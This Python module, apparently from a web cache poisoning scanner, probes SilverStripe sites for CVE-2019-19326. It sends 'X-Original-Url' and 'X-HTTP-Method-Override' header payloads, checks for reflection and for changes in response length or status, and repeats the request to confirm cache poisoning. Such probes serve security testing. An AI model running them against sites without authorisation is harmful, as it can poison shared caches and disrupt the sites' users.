#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
https://www.silverstripe.org/download/security-releases/cve-2019-19326/
https://docs.silverstripe.org/en/3/changelogs/3.7.5/
"""


from modules.utils import requests, random, sys, configure_logger, Identify

logger = configure_logger(__name__)

CONTENT_DELTA_RANGE = 500
BIG_CONTENT_DELTA_RANGE = 1000


def confirm_vuln(url, s, authent, headers):
    for _ in range(5):
        req_verify = s.get(url, verify=False, auth=authent, headers=headers, timeout=10, allow_redirects=False)
    req_confirm = s.get(url, verify=False, auth=authent, timeout=10, allow_redirects=False)


def silverstripe(url, s, req_main, custom_header, authent):

    main_len = len(req_main.content)
    headers = {
    "X-Original-Url": "plopiplop",
    "X-HTTP-Method-Override": "POST"
    }
    try:
        req = s.get(url, verify=False, auth=authent, headers=headers, timeout=10, allow_redirects=False)
        len_req = len(req.content)


        range_exlusion = range(main_len - CONTENT_DELTA_RANGE, main_len + CONTENT_DELTA_RANGE) if main_len < 10000 else range(main_len - BIG_CONTENT_DELTA_RANGE, main_len + BIG_CONTENT_DELTA_RANGE)

        if "plopiplop" in req.text or "plopiplop" in req.headers:
            print(f" {Identify.behavior} | CVE-2019-19326 | TAG OK | \033[34m{url}\033[0m | PAYLOAD: {headers}")
            confirm_vuln(url, s, authent, headers)
        elif len_req not in range_exlusion and req.status_code not in [403, 429, 301, 302]:
            print(f" {Identify.behavior} | CVE-2019-19326 | \033[34m{url}\033[0m | DIFFERENT RESPONSE LENGTH {main_len}b > {len_req}b | PAYLOAD: {headers}")
            confirm_vuln(url, s, authent, headers)
        elif req.status_code != req_main.status_code and req.status_code not in [403, 429]:
            print(f" {Identify.behavior} | CVE-2019-19326 | \033[34m{url}\033[0m | DIFFERENT STATUS-CODE | {req_main.status_code} > {req.status_code} | PAYLOAD: {headers}")
            confirm_vuln(url, s, authent, headers)
    except requests.Timeout:
        #print(f"request timeout {url} {p}")
        pass
    except KeyboardInterrupt:
        print("Exiting")
        sys.exit()
    except Exception as e:
        #print(f"Error : {e}")
        logger.exception(e)
        pass